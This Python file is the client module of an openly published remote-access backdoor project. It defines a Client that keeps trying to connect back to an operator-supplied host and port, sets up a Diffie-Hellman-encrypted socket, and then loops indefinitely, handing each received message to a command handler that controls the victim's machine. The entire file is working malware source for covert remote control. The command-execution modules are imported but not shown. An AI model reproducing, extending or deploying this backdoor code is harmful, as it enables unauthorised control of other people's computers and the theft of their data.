"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import socket
import time
import logging

from src.definitions import platforms
from src.diffie_hellman import DiffieHellman
from src.logger import LOGGER_ID

if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
    from src.client.control.unix import Unix as Control
else:
    from src.client.control.windows import Windows as Control

from src.encrypted_socket import EncryptedSocket
from src.client.command_handler import CommandHandler


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.es = None
        self.logger = logging.getLogger(LOGGER_ID)

    def connect(self):
        _socket = socket.socket()

        while True:  # infinite loop until socket can connect
            try:
                _socket.connect((self.host, self.port))
            except socket.error:
                time.sleep(3)  # wait 3 seconds to try again
            else:
                break

        # first message is always the servers public key
        key = int(_socket.recv(1024).decode())

        self.logger.debug(f"recv key: {key}")

        dh = DiffieHellman()

        # send the client pub key
        _socket.send(str(dh.pub_key).encode())

        dh.set_shared_key(key)

        self.logger.debug(f"send key: {dh.pub_key}")

        self.es = EncryptedSocket(_socket, dh.key)

        ch = CommandHandler(Control(self.es))

        del dh

        while True:
            msg = self.es.recv_json()
            ch.parse(msg)
